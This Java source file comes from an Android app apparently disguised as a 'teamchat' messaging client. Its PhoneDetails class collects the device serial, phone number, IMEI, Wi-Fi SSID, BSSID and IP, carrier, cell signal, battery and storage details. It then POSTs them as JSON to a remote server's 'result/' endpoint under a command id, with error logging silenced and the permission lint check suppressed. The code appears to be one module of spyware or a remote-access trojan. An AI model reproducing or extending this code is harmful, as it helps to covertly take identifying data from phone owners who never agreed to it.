package com.example.teamchat;

import static com.example.teamchat.Constants.SERVER;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Point;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.telephony.CellInfo;
import android.telephony.CellInfoCdma;
import android.telephony.CellInfoGsm;
import android.telephony.CellInfoLte;
import android.telephony.CellSignalStrengthCdma;
import android.telephony.CellSignalStrengthGsm;
import android.telephony.CellSignalStrengthLte;
import android.telephony.TelephonyManager;
import android.text.format.Formatter;
import android.util.Log;
import android.view.Display;
import android.view.WindowManager;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.File;
import java.io.IOException;
import java.util.concurrent.CountDownLatch;

public class PhoneDetails {
    private final static String TAG = ChatService.class.getSimpleName();

    public static void getAllDetails(Context context, String id){
        JSONObject allDetails = new JSONObject();
        JSONObject parentObject = new JSONObject();
        try {
            allDetails.put("DeviceDetails", getDeviceDetails());
            allDetails.put("OSDetails", getOSDetails());
            allDetails.put("DisplayDetails", getDisplayDetails(context));
            allDetails.put("BatteryDetails", getBatteryDetails(context));
            allDetails.put("NetworkDetails", getNetworkDetails(context));
            allDetails.put("StorageDetails", getStorageInformation(context));
            allDetails.put("TelephonyDetails", getTelephonyDetails(context));

            parentObject.put("code", "phonedetails");
            parentObject.put("data", allDetails);
        } catch (JSONException e) {
            //Log.e(TAG, "Error creating JSON object: " + e.getMessage());
        }

        try {
            HttpConnection.ReturnResponse response = HttpConnection.connect(SERVER + "result/" + id, "POST", parentObject.toString());

            assert response != null;
            if (response.responseCode == 200) {
                Log.d(TAG, "Response: " + response.body);
            } else {
                throw new IOException("Unexpected code " + response.responseCode);
            }
        } catch (IOException e) {
            //Log.e(TAG, "Error sending request: " + e.getMessage());
        }
    }

    private static JSONObject getDeviceDetails(){
        JSONObject json = null;
        try {
            json = new JSONObject();
            json.put("model", Build.MODEL);
            json.put("manufacturer", Build.MANUFACTURER);
            json.put("brand", Build.BRAND);
            json.put("product", Build.PRODUCT);
            json.put("device", Build.DEVICE);
            json.put("board", Build.BOARD);
            json.put("display", Build.DISPLAY);
            json.put("hardware", Build.HARDWARE);
            json.put("id", Build.ID);
            json.put("serial", Build.SERIAL);
            json.put("type", Build.TYPE);
            json.put("user", Build.USER);
        } catch (JSONException e) {
            //Log.e(TAG, "Error creating JSON object: " + e.getMessage());
        }
        return json;
    }

    private static JSONObject getOSDetails(){
        JSONObject json = null;
        try {
            json = new JSONObject();
            json.put("androidVersion", Build.VERSION.RELEASE);
            json.put("sdkVersion", Build.VERSION.SDK_INT);
        } catch (JSONException e) {
            //Log.e(TAG, "Error creating JSON object: " + e.getMessage());
        }
        return json;
    }

    private static JSONObject getDisplayDetails(Context context){
        WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        Display display = wm.getDefaultDisplay();
        Point size = new Point();
        display.getSize(size);
        int width = size.x;
        int height = size.y;
        float density = context.getResources().getDisplayMetrics().density;

        JSONObject json = null;
        try {
            json = new JSONObject();
            json.put("width", width);
            json.put("height", height);
            json.put("PPI", density);
        } catch (JSONException e) {
            //Log.e(TAG, "Error creating JSON object: " + e.getMessage());
        }
        return json;
    }

    public static CountDownLatch latch = new CountDownLatch(1);
    public static int level;
    public static int status;
    public static boolean isCharging;
    public static BroadcastReceiver batteryReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
            isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||  status == BatteryManager.BATTERY_STATUS_FULL;
            latch.countDown();
        }
    };

    private static JSONObject getBatteryDetails(Context context){
        try {
            IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            context.registerReceiver(batteryReceiver, filter);
            latch.await();
        } catch (InterruptedException e) {

        }

        JSONObject json = null;
        try {
            json = new JSONObject();
            json.put("level", level);
            json.put("status", status);
            json.put("isCharging", isCharging);
        } catch (JSONException e) {
            Log.e(TAG, "Error creating JSON object: " + e.getMessage());
        }
        return json;
    }

    private static JSONObject getNetworkDetails(Context context){
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
        int networkType = activeNetwork.getType();
        boolean isNetworkAvailable = isNetworkAvailable(context);
        boolean isWifiConnected = isWifiConnected(context);
        boolean isMobileConnected = isMobileConnected(context);

        JSONObject json = null, wifiobject = null, mobileobject = null;
        try {
            json = new JSONObject();
            wifiobject = new JSONObject();
            mobileobject = new JSONObject();

            json.put("networkType", networkType);
            json.put("isNetworkAvailable", isNetworkAvailable);
            json.put("isWifiConnected", isWifiConnected);
            json.put("isMobileConnected", isMobileConnected);

            // network is available
            if (isNetworkAvailable) {
                if (isWifiConnected) {
                    // if mobile connect to wifi
                    WifiManager wifiManager = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                    WifiInfo wifiInfo = wifiManager.getConnectionInfo();

                    String ssid = wifiInfo.getSSID();
                    String bssid = wifiInfo.getBSSID();
                    int linkSpeed = wifiInfo.getLinkSpeed();
                    String ipAddress = Formatter.formatIpAddress(wifiInfo.getIpAddress());

                    int networkId = wifiInfo.getNetworkId();
                    int signalStrength = wifiInfo.getRssi();

                    wifiobject.put("ssid", ssid);
                    wifiobject.put("bssid", bssid);
                    wifiobject.put("linkSpeed", linkSpeed);
                    wifiobject.put("ipAddress", ipAddress);
                    wifiobject.put("networkId", networkId);
                    wifiobject.put("signalStrength", signalStrength);
                }

                if (!isMobileConnected) {
                    // if mobile connect to mobile data
                    NetworkInfo mobileNetwork = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
                    String mobileType = getNetworkType(mobileNetwork.getSubtype());

                    mobileobject.put("mobileType", mobileType);
                    mobileobject.put("State", mobileNetwork.getState());
                    mobileobject.put("detailedState", mobileNetwork.getDetailedState());

                    TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                    String operatorName = tm.getNetworkOperatorName();      // e.g. AT&T, T-Mobile, Vodafone, etc.
                    String operatorCode = tm.getNetworkOperator();          // e.g. MCC and MNC
                    boolean roaming = tm.isNetworkRoaming();

                    mobileobject.put("operatorName", operatorName);
                    mobileobject.put("operatorCode", operatorCode);
                    mobileobject.put("roaming", roaming);

                    int strength = 0;
                    if (tm.getAllCellInfo().size() != 0) {
                        CellInfo cellInfo = tm.getAllCellInfo().get(0);
                        if (cellInfo instanceof CellInfoGsm) {
                            CellSignalStrengthGsm gsm = ((CellInfoGsm) cellInfo).getCellSignalStrength();
                            strength = gsm.getDbm();
                        } else if (cellInfo instanceof CellInfoCdma) {
                            CellSignalStrengthCdma cdma = ((CellInfoCdma) cellInfo).getCellSignalStrength();
                            strength = cdma.getDbm();
                        } else if (cellInfo instanceof CellInfoLte) {
                            CellSignalStrengthLte lte = ((CellInfoLte) cellInfo).getCellSignalStrength();
                            strength = lte.getDbm();
                        }

                    }
                    mobileobject.put("strength", strength);
                }

                json.put("wifiDetails", wifiobject);
                json.put("mobileDetails", mobileobject);
            }
        } catch (JSONException e) {
            //Log.e(TAG, "Error creating JSON object: " + e.getMessage());
        }
        return json;
    }

    private static JSONObject getStorageInformation(Context context){
        File externalStorage = Environment.getExternalStorageDirectory();
        long totalExternalStorage = externalStorage.getTotalSpace();
        long availableExternalStorage = externalStorage.getFreeSpace();

        File internalStorage = Environment.getDataDirectory();
        long totalInternalStorage = internalStorage.getTotalSpace();
        long availableInternalStorage = internalStorage.getFreeSpace();

        JSONObject json = null;
        try {
            json = new JSONObject();
            json.put("totalExternalStorage", totalExternalStorage/ (1024 * 1024));
            json.put("availableExternalStorage", availableExternalStorage/ (1024 * 1024));
            json.put("totalInternalStorage", totalInternalStorage/ (1024 * 1024));
            json.put("availableInternalStorage", availableInternalStorage/ (1024 * 1024));

            File[] roots = context.getExternalFilesDirs(null);
            for (File root : roots) {
                StatFs stat = new StatFs(root.getPath());
                long totalBytes = (long) stat.getBlockCount() * stat.getBlockSize();
                long availableBytes = (long) stat.getAvailableBlocks() * stat.getBlockSize();

                json.put("storagePath", root.getPath());
                json.put("totalSpace", totalBytes / (1024 * 1024));
                json.put("availableSpace", availableBytes / (1024 * 1024));
            }
        } catch (NullPointerException | JSONException e) {
//            if (e instanceof NullPointerException) {
//                Log.e(TAG, "Error getting storage size: " + e.getMessage());
//            } else if (e instanceof JSONException) {
//                Log.e(TAG, "Error creating JSON object: " + e.getMessage());
//            }
        }
        return json;
    }

    @SuppressLint("MissingPermission")
    private static JSONObject getTelephonyDetails(Context context) {
        TelephonyManager manager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String phoneNumber1 = manager.getLine1Number();

        JSONObject json = null;
        try {
            json = new JSONObject();
            json.put("phoneNumber", phoneNumber1);

            // Other Information:
            if(android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) { // API Level 26.
                try {
                    String imei = manager.getImei();
                    json.put("imei", imei);
                } catch (Exception e) {
                    //Log.e("[ERROR]", "Unable to retrieve IMEI");
                    json.put("imei", "Unknown");
                }
            }
        } catch (JSONException e) {
            //Log.e(TAG, "Error creating JSON object: " + e.getMessage());
        }
        return json;
    }

    public static boolean isNetworkAvailable(Context context) {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }

    public static boolean isWifiConnected(Context context) {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo wifiNetworkInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        return wifiNetworkInfo != null && wifiNetworkInfo.isConnected();
    }

    public static boolean isMobileConnected(Context context) {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mobileNetworkInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
        return mobileNetworkInfo != null && mobileNetworkInfo.isConnected();
    }

    private static String getNetworkType(int type) {
        if (type == TelephonyManager.NETWORK_TYPE_GPRS ||  type == TelephonyManager.NETWORK_TYPE_EDGE) {
            // network is 2G
            return "2G";
        } else if (type == TelephonyManager.NETWORK_TYPE_UMTS ||  type == TelephonyManager.NETWORK_TYPE_HSDPA ||  type == TelephonyManager.NETWORK_TYPE_HSPA ||  type == TelephonyManager.NETWORK_TYPE_HSPAP) {
            // network is 3G
            return "3G";
        } else if (type == TelephonyManager.NETWORK_TYPE_LTE) {
            // network is 4G
            return "4G";
        } else {
            return "Unknown";
        }
    }

    public int getLevel() {
        return level;
    }

    public void setLevel(int level){
        this.level = level;
    }
}